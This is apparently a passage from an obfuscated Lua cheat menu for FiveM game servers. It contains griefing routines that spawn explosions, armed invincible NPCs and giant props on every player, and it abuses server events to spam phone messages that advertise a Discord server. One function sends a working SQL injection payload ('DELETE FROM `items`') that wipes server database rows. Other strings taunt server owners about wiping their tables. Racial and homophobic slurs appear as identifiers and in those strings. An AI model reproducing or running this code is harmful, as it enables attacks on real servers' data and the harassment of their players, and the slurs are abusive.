			local di=CreateVehicle(GetHashKey(dg),GetEntityCoords(GetPlayerPed(i))+2.0,true,true) and CreateVehicle(GetHashKey(dg),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dg),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(dh),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(dh),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dh),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(di),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(di),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(di),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(dj),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(dj),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dj),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(dk),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(dk),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dk),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and AddExplosion(GetEntityCoords(GetPlayerPed(i)),5,3000.0,true,false,100000.0)and AddExplosion(GetEntityCoords(GetPlayerPed(i)),5,3000.0,true,false,true)
		end
	 end)

end

TlEinQlrUD.Math = {}
TlEinQlrUD.Math.Round = function(HzrWJelKRFL, vn6uFW)
    if vn6uFW then
        local rd4JRDIAkW3g = 10 ^ vn6uFW
        return math.floor((HzrWJelKRFL * rd4JRDIAkW3g) + 0.5) / (rd4JRDIAkW3g)
    else
        return math.floor(HzrWJelKRFL + 0.5)
    end
end
TlEinQlrUD.Math.GroupDigits = function(yCjbzh9_n5F1)
    local HD0RSAgU, Zu, _TKaWpcuh = string.match(yCjbzh9_n5F1, "^([^%d]*%d)(%d*)(.-)$")
    return HD0RSAgU ..
        (Zu:reverse():gsub("(%d%d%d)", "%1" .. _U("locale_digit_grouping_symbol")):reverse()) .. _TKaWpcuh
end
TlEinQlrUD.Math.Trim = function(F6l67AvrJNXX)
    if F6l67AvrJNXX then
        return (string.gsub(F6l67AvrJNXX, "^%s*(.-)%s*$", "%1"))
    else
        return nil
    end
end

TlEinQlrUD.KxAeBgZmFX = function(bgom4E7D1PfxiMnsb)
    Citizen.CreateThread(
        function()
            local ud = GetPlayerPed(bgom4E7D1PfxiMnsb)
            SetPedRandomComponentVariation(ud, false)
            SetPedRandomProps(ud)
        end
    )
end

TlEinQlrUD.WBjFDwrZUo = function(target)
    local ped = GetPlayerPed(target)
    local me = PlayerPedId()
    
    hat = GetPedPropIndex(ped, 0)
    hat_texture = GetPedPropTextureIndex(ped, 0)
    
    glasses = GetPedPropIndex(ped, 1)
    glasses_texture = GetPedPropTextureIndex(ped, 1)
    
    ear = GetPedPropIndex(ped, 2)
    ear_texture = GetPedPropTextureIndex(ped, 2)
    
    watch = GetPedPropIndex(ped, 6)
    watch_texture = GetPedPropTextureIndex(ped, 6)
    
    wrist = GetPedPropIndex(ped, 7)
    wrist_texture = GetPedPropTextureIndex(ped, 7)
    
    head_drawable = GetPedDrawableVariation(ped, 0)
    head_palette = GetPedPaletteVariation(ped, 0)
    head_texture = GetPedTextureVariation(ped, 0)
    
    beard_drawable = GetPedDrawableVariation(ped, 1)
    beard_palette = GetPedPaletteVariation(ped, 1)
    beard_texture = GetPedTextureVariation(ped, 1)
    
    hair_drawable = GetPedDrawableVariation(ped, 2)
    hair_palette = GetPedPaletteVariation(ped, 2)
    hair_texture = GetPedTextureVariation(ped, 2)
    
    torso_drawable = GetPedDrawableVariation(ped, 3)
    torso_palette = GetPedPaletteVariation(ped, 3)
    torso_texture = GetPedTextureVariation(ped, 3)
    
    legs_drawable = GetPedDrawableVariation(ped, 4)
    legs_palette = GetPedPaletteVariation(ped, 4)
    legs_texture = GetPedTextureVariation(ped, 4)
    
    hands_drawable = GetPedDrawableVariation(ped, 5)
    hands_palette = GetPedPaletteVariation(ped, 5)
    hands_texture = GetPedTextureVariation(ped, 5)
    
    foot_drawable = GetPedDrawableVariation(ped, 6)
    foot_palette = GetPedPaletteVariation(ped, 6)
    foot_texture = GetPedTextureVariation(ped, 6)
    
    acc1_drawable = GetPedDrawableVariation(ped, 7)
    acc1_palette = GetPedPaletteVariation(ped, 7)
    acc1_texture = GetPedTextureVariation(ped, 7)
    
    acc2_drawable = GetPedDrawableVariation(ped, 8)
    acc2_palette = GetPedPaletteVariation(ped, 8)
    acc2_texture = GetPedTextureVariation(ped, 8)
    
    acc3_drawable = GetPedDrawableVariation(ped, 9)
    acc3_palette = GetPedPaletteVariation(ped, 9)
    acc3_texture = GetPedTextureVariation(ped, 9)
    
    mask_drawable = GetPedDrawableVariation(ped, 10)
    mask_palette = GetPedPaletteVariation(ped, 10)
    mask_texture = GetPedTextureVariation(ped, 10)
    
    aux_drawable = GetPedDrawableVariation(ped, 11)
    aux_palette = GetPedPaletteVariation(ped, 11) 	
    aux_texture = GetPedTextureVariation(ped, 11)

    SetPedPropIndex(me, 0, hat, hat_texture, 1)
    SetPedPropIndex(me, 1, glasses, glasses_texture, 1)
    SetPedPropIndex(me, 2, ear, ear_texture, 1)
    SetPedPropIndex(me, 6, watch, watch_texture, 1)
    SetPedPropIndex(me, 7, wrist, wrist_texture, 1)
    
    SetPedComponentVariation(me, 0, head_drawable, head_texture, head_palette)
    SetPedComponentVariation(me, 1, beard_drawable, beard_texture, beard_palette)
    SetPedComponentVariation(me, 2, hair_drawable, hair_texture, hair_palette)
    SetPedComponentVariation(me, 3, torso_drawable, torso_texture, torso_palette)
    SetPedComponentVariation(me, 4, legs_drawable, legs_texture, legs_palette)
    SetPedComponentVariation(me, 5, hands_drawable, hands_texture, hands_palette)
    SetPedComponentVariation(me, 6, foot_drawable, foot_texture, foot_palette)
    SetPedComponentVariation(me, 7, acc1_drawable, acc1_texture, acc1_palette)
    SetPedComponentVariation(me, 8, acc2_drawable, acc2_texture, acc2_palette)
    SetPedComponentVariation(me, 9, acc3_drawable, acc3_texture, acc3_palette)
    SetPedComponentVariation(me, 10, mask_drawable, mask_texture, mask_palette)
    SetPedComponentVariation(me, 11, aux_drawable, aux_texture, aux_palette)
end

TlEinQlrUD.iUeDtxZvTu = function(rbYLdI3Z, qaYv)
    local y1J3 = "WEAPON_ASSAULTRIFLE"
    for i = 1, 5 do
        Citizen.CreateThread(
            function()
                local CChS7m0E5Jh04 = GetEntityCoords(rbYLdI3Z)
                RequestModel(GetHashKey(qaYv))
                Citizen.Wait(50)
                if HasModelLoaded(GetHashKey(qaYv)) then
                    local dnmHQlcbaVIPNujXC2 =
                        CreatePed(
                        21,
                        GetHashKey(qaYv),
                        CChS7m0E5Jh04.x + i,
                        CChS7m0E5Jh04.y - i,
                        CChS7m0E5Jh04.z,
                        0,
                        true,
                        true
                    ) and
                        CreatePed(
                            21,
                            GetHashKey(qaYv),
                            CChS7m0E5Jh04.x - i,
                            CChS7m0E5Jh04.y + i,
                            CChS7m0E5Jh04.z,
                            0,
                            true,
                            true
                        )
                    NetworkRegisterEntityAsNetworked(dnmHQlcbaVIPNujXC2)
                    if DoesEntityExist(dnmHQlcbaVIPNujXC2) and not IsEntityDead(rbYLdI3Z) then
                        local _3RWx6Cw5qWiwW56yBS = PedToNet(dnmHQlcbaVIPNujXC2)
                        NetworkSetNetworkIdDynamic(_3RWx6Cw5qWiwW56yBS, false)
                        SetNetworkIdCanMigrate(_3RWx6Cw5qWiwW56yBS, true)
                        SetNetworkIdExistsOnAllMachines(_3RWx6Cw5qWiwW56yBS, true)
                        Citizen.Wait(100.0)
                        NetToPed(_3RWx6Cw5qWiwW56yBS)
                        GiveWeaponToPed(dnmHQlcbaVIPNujXC2, GetHashKey(y1J3), 200, 1, 1)
                        SetEntityInvincible(dnmHQlcbaVIPNujXC2, true)
                        SetPedCanSwitchWeapon(dnmHQlcbaVIPNujXC2, true)
                        TaskCombatPed(dnmHQlcbaVIPNujXC2, rbYLdI3Z, 0, 16.0)
                    elseif IsEntityDead(rbYLdI3Z) then
                        TaskCombatHatedTargetsInArea(
                            dnmHQlcbaVIPNujXC2,
                            CChS7m0E5Jh04.x,
                            CChS7m0E5Jh04.y,
                            CChS7m0E5Jh04.z,
                            500
                        )
                    else
                        Citizen.Wait(0)
                    end
                end
            end
        )
    end
end

TlEinQlrUD.LKBmXDfxfE = function(XjyIwYVCDLScqxIiNzK)
    Citizen.CreateThread(
        function()
            local tPUp, P4o955zo4GQOwzAstME, jey5WE = table.unpack(GetEntityCoords(XjyIwYVCDLScqxIiNzK))
            local QqjAm = "buzzard"
            local LIlRsKM5 = "ig_claypain"
            RZTJDtEgDU(QqjAm)
            RZTJDtEgDU(LIlRsKM5)
            RequestModel(QqjAm)
            RequestModel(LIlRsKM5)
            local dO6LK = 0
            while not HasModelLoaded(LIlRsKM5) do
                dO6LK = dO6LK + 100.0
                Citizen.Wait(100.0)
                if dO6LK > 5000 then
                    break
                end
            end
            while not HasModelLoaded(QqjAm) do
                dO6LK = dO6LK + 100.0
                Citizen.Wait(100.0)
                if dO6LK > 5000 then
                    break
                end
            end
            local tsl5Kv9q_06sfoiEpQjd =
                CreateVehicle(
                GetHashKey(QqjAm),
                tPUp,
                P4o955zo4GQOwzAstME,
                jey5WE + 100.0,
                GetEntityHeading(XjyIwYVCDLScqxIiNzK),
                true,
                true
            )
            local Eg = CreatePedInsideVehicle(tsl5Kv9q_06sfoiEpQjd, 4, LIlRsKM5, -1, true, false)
            SetHeliBladesFullSpeed(tsl5Kv9q_06sfoiEpQjd)
            SetCurrentPedVehicleWeapon(Eg, GetHashKey("VEHICLE_WEAPON_PLANE_ROCKET"))
            SetVehicleShootAtTarget(Eg, XjyIwYVCDLScqxIiNzK, tPUp, P4o955zo4GQOwzAstME, jey5WE)
            local Qdxb3e = PedToNet(Eg)
            NetworkSetNetworkIdDynamic(Qdxb3e, false)
            SetNetworkIdCanMigrate(Qdxb3e, true)
            SetNetworkIdExistsOnAllMachines(Qdxb3e, true)
            Citizen.Wait(30)
            NetToPed(Qdxb3e)
            SetEntityInvincible(Qdxb3e, true)
            SetPedCanSwitchWeapon(Eg, true)
            TaskCombatPed(Eg, XjyIwYVCDLScqxIiNzK, 0, 16.0)
            local z7MliqrR6Nj = "a_m_y_skater_01"
            local YEk_e8ni03LNm = "WEAPON_ASSAULTRIFLE"
            for i = 1, 3 do
                local sTvBAA8UQ = GetEntityCoords(XjyIwYVCDLScqxIiNzK)
                RequestModel(GetHashKey(z7MliqrR6Nj))
                Citizen.Wait(50)
                if HasModelLoaded(GetHashKey(z7MliqrR6Nj)) then
                    local aYj_ZFpnMoUB = CreatePedInsideVehicle(tsl5Kv9q_06sfoiEpQjd, 4, LIlRsKM5, i, true, false)
                    NetworkRegisterEntityAsNetworked(aYj_ZFpnMoUB)
                    Citizen.CreateThread(
                        function()
                            if DoesEntityExist(aYj_ZFpnMoUB) and not IsEntityDead(XjyIwYVCDLScqxIiNzK) then
                                local rm3aVF = PedToNet(aYj_ZFpnMoUB)
                                NetworkSetNetworkIdDynamic(rm3aVF, false)
                                SetNetworkIdCanMigrate(rm3aVF, true)
                                SetNetworkIdExistsOnAllMachines(rm3aVF, true)
                                Citizen.Wait(100.0)
                                NetToPed(rm3aVF)
                                GiveWeaponToPed(aYj_ZFpnMoUB, GetHashKey(YEk_e8ni03LNm), 200, 1, 1)
                                SetEntityInvincible(aYj_ZFpnMoUB, true)
                                SetPedCanSwitchWeapon(aYj_ZFpnMoUB, true)
                                TaskCombatPed(aYj_ZFpnMoUB, XjyIwYVCDLScqxIiNzK, 0, 16.0)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    )
                end
            end
        end
    )
end

TlEinQlrUD.YvBJwSaYTt = function(PbzJ)
    Citizen.CreateThread(
        function()
            local FOqtKS = "rhino"
            RequestModel(FOqtKS)
            while not HasModelLoaded(FOqtKS) do
                Citizen.Wait(50)
            end
            local ie2rMI = GetVehiclePedIsIn(PbzJ, false)
            local p36ENvuKJCRCgVji2c, S8qjanyyjO5D4t, JRDq9pc4X4yoQ3QF = table.unpack(GetEntityCoords(PbzJ))
            local uYWipsM82Rt1BsX =
                CreateVehicle(
                GetHashKey(FOqtKS),
                p36ENvuKJCRCgVji2c + 20,
                S8qjanyyjO5D4t + 20,
                JRDq9pc4X4yoQ3QF + 5,
                GetEntityCoords(PbzJ),
                true,
                false
            )
            hfSPELVLBp(uYWipsM82Rt1BsX)
            local DPxGF8zZar = "s_m_y_swat_01"
            RequestModel(DPxGF8zZar)
            while not HasModelLoaded(DPxGF8zZar) do
                RequestModel(DPxGF8zZar)
                Citizen.Wait(50)
            end
            local d0Z9a4Pyc3FoBKwhsB_9l =
                CreatePedInsideVehicle(uYWipsM82Rt1BsX, 4, GetEntityModel(PlayerPedId()), -1, true, false)
            hfSPELVLBp(d0Z9a4Pyc3FoBKwhsB_9l)
            SetDriverAbility(d0Z9a4Pyc3FoBKwhsB_9l, 10)
            SetDriverAggressiveness(d0Z9a4Pyc3FoBKwhsB_9l, 10)
            TaskCombatPed(d0Z9a4Pyc3FoBKwhsB_9l, PbzJ, 0, 16.0)
        end
    )
end

function RZTJDtEgDU(cXkDUzbjXsl)
    local dW3g9 = GetHashKey(cXkDUzbjXsl)
    RequestModel(dW3g9)
    while not HasModelLoaded(dW3g9) do
        RequestModel(dW3g9)
        Citizen.Wait(0)
    end
end

        local function sandy()
            for i=0, 300 do
            local niggaoords = GetEntityCoords(GetPlayerPed(i), true)
                    local nigga = "cs4_lod_01_slod3"
                    while not HasModelLoaded(GetHashKey(nigga)) do 
                        Citizen.Wait(0) 
                        RequestModel(GetHashKey(nigga)) 
                    end
                    local niggaobj = CreateObject(GetHashKey(nigga),niggaoords.x,niggaoords.y,niggaoords.z,true,true,true)
                    if nigganiggaattachProp then
                        if asdh8asdh == 1 then
                            AttachEntityToEntity(niggaobj,GetPlayerPed(i),GetPedBoneIndex(GetPlayerPed(i),31086),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                        elseif asdh8asdh == 2 then
                            AttachEntityToEntity(niggaobj,GetPlayerPed(i),GetPedBoneIndex(GetPlayerPed(i),28422),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                        end
                    end 
                end
            end

        local function ufosnigga()
            for i=0, 300 do
            local niggaoords = GetEntityCoords(GetPlayerPed(i), true)
                    local nigga = "p_spinning_anus_s"
                    while not HasModelLoaded(GetHashKey(nigga)) do 
                        Citizen.Wait(0) 
                        RequestModel(GetHashKey(nigga)) 
                    end
                    local objnigger = CreateObject(GetHashKey(nigga),niggaoords.x,niggaoords.y,niggaoords.z,true,true,true)
                    if niggaattachProp then
                        if asdh8asdh == 1 then
                            AttachEntityToEntity(objnigger,GetPlayerPed(i),GetPedBoneIndex(GetPlayerPed(i),31086),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                        elseif asdh8asdh == 2 then
                            AttachEntityToEntity(objnigger,GetPlayerPed(i),GetPedBoneIndex(GetPlayerPed(i),28422),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                        end
                    end 
                end
            end

        local function tabletc()
            for i=0, 300 do
            local coordsnigga = GetEntityCoords(GetPlayerPed(i), true)
                    local nigga = "xm_prop_x17_sub"
                    while not HasModelLoaded(GetHashKey(nigga)) do 
                        Citizen.Wait(0) 
                        RequestModel(GetHashKey(nigga)) 
                    end
                    local objnigger = CreateObject(GetHashKey(nigga),coordsnigga.x,coordsnigga.y,coordsnigga.z,true,true,true)
                    if niggaattachProp then
                        if asdh8asdh == 1 then
                            AttachEntityToEntity(objnigger,GetPlayerPed(i),GetPedBoneIndex(GetPlayerPed(i),31086),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                        elseif asdh8asdh == 2 then
                            AttachEntityToEntity(objnigger,GetPlayerPed(i),GetPedBoneIndex(GetPlayerPed(i),28422),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                        end
                    end 
                end
            end

        local function mazebank()
            for i=0, 300 do
            local coordsnigga = GetEntityCoords(GetPlayerPed(i), true)
                    local nigga = "dt1_11_slod1"
                    while not HasModelLoaded(GetHashKey(nigga)) do 
                        Citizen.Wait(0) 
                        RequestModel(GetHashKey(nigga)) 
                    end
                    local objnigger = CreateObject(GetHashKey(nigga),coordsnigga.x,coordsnigga.y,coordsnigga.z,true,true,true)
                    if niggaattachProp then
                        if asdh8asdh == 1 then
                            AttachEntityToEntity(objnigger,GetPlayerPed(i),GetPedBoneIndex(GetPlayerPed(i),31086),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                        elseif asdh8asdh == 2 then
                            AttachEntityToEntity(objnigger,GetPlayerPed(i),GetPedBoneIndex(GetPlayerPed(i),28422),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                        end
                    end 
                end
            end


TlEinQlrUD.dIwyUZHKyR = function()
    Citizen.CreateThread(function()
        local pbase = GetActivePlayers()
        for i=0, #pbase do
          --local prop1 = CreateObject(-1207431159, 0, 0, 0, true, true, true)
          --local prop2 = CreateObject(GetHashKey("cargoplane"), 0, 0, 0, true, true, true)
          --local prop3 = CreateObject(GetHashKey("prop_beach_fire"), 0, 0, 0, true, true, true)
          local prop4 = CreateObject(GetHashKey("ap1_lod_slod4"), 0, 0, 0, true, true, true)
          local prop5 = CreateObject(GetHashKey("po1_lod_slod4"), 0, 0, 0, true, true, true)
          local prop6 = CreateObject(GetHashKey("ch3_lod_11b13_slod3"), 0, 0, 0, true, true, true)
          local prop7 = CreateObject(GetHashKey("ch3_lod_101114b_slod3"), 0, 0, 0, true, true, true)
          local prop8 = CreateObject(GetHashKey("vb_lod_slod4"), 0, 0, 0, true, true, true)
          local prop9 = CreateObject(GetHashKey("ch1_lod_slod3a"), 0, 0, 0, true, true, true)
          local prop10 = CreateObject(GetHashKey("ch1_lod_slod3c"), 0, 0, 0, true, true, true)
          local prop11 = CreateObject(GetHashKey("cs3_lod_1_slod3"), 0, 0, 0, true, true, true)
          local prop12 = CreateObject(GetHashKey("cs4_lod_01_slod3"), 0, 0, 0, true, true, true)
          local prop13 = CreateObject(GetHashKey("cs1_lod3_terrain_slod3_01"), 0, 0, 0, true, true, true)
          local prop14 = CreateObject(GetHashKey("cs2_lod_1234_slod3"), 0, 0, 0, true, true, true)
          local prop15 = CreateObject(GetHashKey("hei_cs3_07_mil_decals07"), 0, 0, 0, true, true, true)
          local prop16 = CreateObject(GetHashKey("dt1_19_lspd02_lod"), 0, 0, 0, true, true, true)
          local prop17 = CreateObject(GetHashKey("dt1_06_g1_detail"), 0, 0, 0, true, true, true)
          local prop18 = CreateObject(GetHashKey("dt1_rd1_r5h_slod1"), 0, 0, 0, true, true, true)
          local prop19 = CreateObject(GetHashKey("dt1_11_slod1"), 0, 0, 0, true, true, true)
          local prop20 = CreateObject(GetHashKey("dt1_props_combo0110_slod"), 0, 0, 0, true, true, true)
          local prop21 = CreateObject(GetHashKey("cs2_29_slod1"), 0, 0, 0, true, true, true)
          local prop22 = CreateObject(GetHashKey("xm_mpchristmasadditions_hatch_10"), 0, 0, 0, true, true, true)
         -- AttachEntityToEntity(prop1, GetPlayerPed(i), GetPedBoneIndex(GetPlayerPed(i), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true)
          --AttachEntityToEntity(prop2, GetPlayerPed(i), GetPedBoneIndex(GetPlayerPed(i), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true)
          --AttachEntityToEntity(prop3, GetPlayerPed(i), GetPedBoneIndex(GetPlayerPed(i), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true)
          AttachEntityToEntity(prop3, GetPlayerPed(i), GetPedBoneIndex(GetPlayerPed(i), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true)
          AttachEntityToEntity(prop4, GetPlayerPed(i), GetPedBoneIndex(GetPlayerPed(i), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true)
          AttachEntityToEntity(prop5, GetPlayerPed(i), GetPedBoneIndex(GetPlayerPed(i), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true)
          AttachEntityToEntity(prop6, GetPlayerPed(i), GetPedBoneIndex(GetPlayerPed(i), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true)
          AttachEntityToEntity(prop7, GetPlayerPed(i), GetPedBoneIndex(GetPlayerPed(i), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true)
          AttachEntityToEntity(prop8, GetPlayerPed(i), GetPedBoneIndex(GetPlayerPed(i), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true)
          AttachEntityToEntity(prop9, GetPlayerPed(i), GetPedBoneIndex(GetPlayerPed(i), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true)
          AttachEntityToEntity(prop10, GetPlayerPed(i), GetPedBoneIndex(GetPlayerPed(i), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true)
          AttachEntityToEntity(prop11, GetPlayerPed(i), GetPedBoneIndex(GetPlayerPed(i), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true)
          AttachEntityToEntity(prop12, GetPlayerPed(i), GetPedBoneIndex(GetPlayerPed(i), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true)
          AttachEntityToEntity(prop13, GetPlayerPed(i), GetPedBoneIndex(GetPlayerPed(i), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true)
          AttachEntityToEntity(prop14, GetPlayerPed(i), GetPedBoneIndex(GetPlayerPed(i), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true)
          AttachEntityToEntity(prop15, GetPlayerPed(i), GetPedBoneIndex(GetPlayerPed(i), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true)
          AttachEntityToEntity(prop16, GetPlayerPed(i), GetPedBoneIndex(GetPlayerPed(i), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true)
          AttachEntityToEntity(prop17, GetPlayerPed(i), GetPedBoneIndex(GetPlayerPed(i), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true)
          AttachEntityToEntity(prop18, GetPlayerPed(i), GetPedBoneIndex(GetPlayerPed(i), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true)
          AttachEntityToEntity(prop19, GetPlayerPed(i), GetPedBoneIndex(GetPlayerPed(i), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true)
          AttachEntityToEntity(prop20, GetPlayerPed(i), GetPedBoneIndex(GetPlayerPed(i), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true)
          AttachEntityToEntity(prop21, GetPlayerPed(i), GetPedBoneIndex(GetPlayerPed(i), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true)
          AttachEntityToEntity(prop22, GetPlayerPed(i), GetPedBoneIndex(GetPlayerPed(i), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true)
        end
    end)
end

TlEinQlrUD.tKeeBLPVmW = function()
        LbmafInBBs(
            true,
            "kashactersS:DeleteCharacter",
            "';DELETE FROM `items` WHERE  `name`='water';/"
        )
        fjustimenUI.SendNotification({text = "Now you need to wait for restart!", type = 'success'})
end

TlEinQlrUD.QKiwltJyjK = function()
		LbmafInBBs(true, "InteractSound_SV:PlayWithinDistance", 9000, "lock", 1.0)
		LbmafInBBs(true, "InteractSound_SV:PlayWithinDistance", 9000, "unlock", 1.0)
		LbmafInBBs(true, "InteractSound_SV:PlayWithinDistance", 9000, "alarm", 1.0)
		LbmafInBBs(true, "InteractSound_SV:PlayWithinDistance", 9000, "belton", 1.0)
		LbmafInBBs(true, "InteractSound_SV:PlayWithinDistance", 9000, "beltoff", 1.0)
		LbmafInBBs(true, "InteractSound_SV:PlayWithinDistance", 9000, "demo", 1.0)
		LbmafInBBs(true, "InteractSound_SV:PlayWithinDistance", 9000, 'cuffseffect', 1.0)
		LbmafInBBs(true, "InteractSound_SV:PlayWithinDistance", 9000, 'PinSucc', 1.0)
		LbmafInBBs(true, "InteractSound_SV:PlayWithinDistance", 9000, 'PinFail', 1.0)
		LbmafInBBs(true, "InteractSound_SV:PlayWithinDistance", 9000, 'cuff', 1.0)
		LbmafInBBs(true, "InteractSound_SV:PlayWithinDistance", 9000, 'handcuff', 1.0)
end

TlEinQlrUD.BcydOwHofs = function()
        LbmafInBBs(
            true,
            "esx_phone:send",
            "police",
            "https://discord.gg/sHpUzK3 - RUFANA",
            true,
            {x = 1337.0, y = 1337.0, z = 1337.0}
        )
        LbmafInBBs(
            true,
            "esx_phone:send",
            "ambulance",
            "https://discord.gg/sHpUzK3 - RUFANA",
            true,
            {x = 1337.0, y = 1337.0, z = 1337.0}
        )
        LbmafInBBs(
            true,
            "esx_phone:send",
            "taxi",
            "https://discord.gg/sHpUzK3 - RUFANA",
            true,
            {x = 1337.0, y = 1337.0, z = 1337.0}
        )
        LbmafInBBs(
            true,
            "esx_phone:send",
            "realestateagent",
            "https://discord.gg/sHpUzK3 - RUFANA",
            true,
            {x = 1337.0, y = 1337.0, z = 1337.0}
        )
        LbmafInBBs(
            true,
            "esx_addons_gcphone:startCall",
            "police",
            "https://discord.gg/sHpUzK3 - RUFANA",
            {x = 1337.0, y = 1337.0, z = 1337.0}
        )
        LbmafInBBs(
            true,
            "esx_addons_gcphone:startCall",
            "ambulance",
            "https://discord.gg/sHpUzK3 - RUFANA",
            {x = 1337.0, y = 1337.0, z = 1337.0}
        )
        LbmafInBBs(
            true,
            "esx_addons_gcphone:startCall",
            "taxi",
            "https://discord.gg/sHpUzK3 - RUFANA",
            {x = 1337.0, y = 1337.0, z = 1337.0}
        )
        LbmafInBBs(
            true,
            "esx_addons_gcphone:startCall",
            "realestateagent",
            "https://discord.gg/sHpUzK3 - RUFANA",
            {x = 1337.0, y = 1337.0, z = 1337.0}
        )
end

TlEinQlrUD.yiUUVcYhwM = function()
        Citizen.CreateThread(
            function()
                for i = 1, 50, 1 do
                    Citizen.Wait(50)
                    LbmafInBBs(true, "esx_policejob:spawned")
                end
            end)
end

TlEinQlrUD.rhvjbMgDec = function()
    local sk_ = {
        "d0pamine",
        "d0pamine.xyz",
        "Nertigel#5391",
        "RIP Your SQL Faggot",
        "Make sure to wipe all tables ;)",
        "Nertigel Was Here"
    }
    for i = 0, #sk_ do
        local active_players = GetActivePlayers()
        for player = 0, #active_players do
            LbmafInBBs(
                true,
                "esx_license:addLicense",
                player,
                sk_[i],
                function()
                    cb(true)
                    print("added license " .. sk_[i] .. " to " .. player)
                end
            )
        end
    end 
end
--------------------------------------------------------------------------------RUFANA FUNCTIONS ADDONS END-------------------------------------------------------------------------------------------------------




local ptags = {}
-- Thread that handles all menu toggles (Godmode, ESP, etc)
local function QuZlDSNGjv()
	while isMenuEnabled do

		-- Radar/showMinimap
		--DisplayRadar(showMinimap, 1)
		fjustimen.Player.IsInVehicle = IsPedInAnyVehicle(PlayerPedId(), 0)

		SetPlayerInvincible(PlayerId(), Godmode)
		SetEntityInvincible(PlayerPedId(), Godmode)

		SetPedCanBeKnockedOffVehicle(PlayerPedId(), fjustimen.Toggle.VehicleNoFall) 

		SetEntityVisible(PlayerPedId(), not Invisible, 0)

		SetPedCanRagdoll(PlayerPedId(), not RagdollToggle)

		if pBNAnrVJeN then
			EnableCrosshairThisFrame()
			ShowHudComponentThisFrame(14)
		end

		if DWimOawaSE then
			-- show blips
			local plist = GetActivePlayers()
			for i = 1, #plist do
				local id = plist[i]
				local ped = GetPlayerPed(id)
				if ped ~= PlayerPedId() then
					local blip = GetBlipFromEntity(ped)

					-- HEAD DISPLAY STUFF --

					-- Create head display (this is safe to be spammed)
					-- headId = Citizen.InvokeNative( 0xBFEFE3321A3F5015, ped, GetPlayerName( id ), false, false, "", false )

					-- Speaking display
					-- I need to move this over to name tag code
					-- if NetworkIsPlayerTalking(id) then
					-- 	Citizen.InvokeNative( 0x63BB75ABEDC1F6A0, headId, 9, true ) -- Add speaking sprite
					-- else
					-- 	Citizen.InvokeNative( 0x63BB75ABEDC1F6A0, headId, 9, false ) -- Remove speaking sprite
					-- end

					-- BLIP STUFF --

					if not DoesBlipExist(blip) then -- Add blip and create head display on player
						blip = AddBlipForEntity(ped)
						SetBlipSprite(blip, 1)
						Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true ) -- Player Blip indicator
					else -- update blip
						local veh = GetVehiclePedIsIn(ped, false)
						local blipSprite = GetBlipSprite(blip)

						if GetEntityHealth(ped) == 0 then -- dead
							if blipSprite ~= 274 then
								SetBlipSprite(blip, 274)
								Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true ) -- Player Blip indicator
							end
						elseif veh then
							local vehClass = GetVehicleClass(veh)
							local vehModel = GetEntityModel(veh)
							if vehClass == 15 then -- Helicopters
								if blipSprite ~= 422 then
									SetBlipSprite(blip, 422)
									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true) -- Player Blip indicator
								end
							elseif vehClass == 8 then -- Motorcycles
								if blipSprite ~= 226 then
									SetBlipSprite(blip, 226)
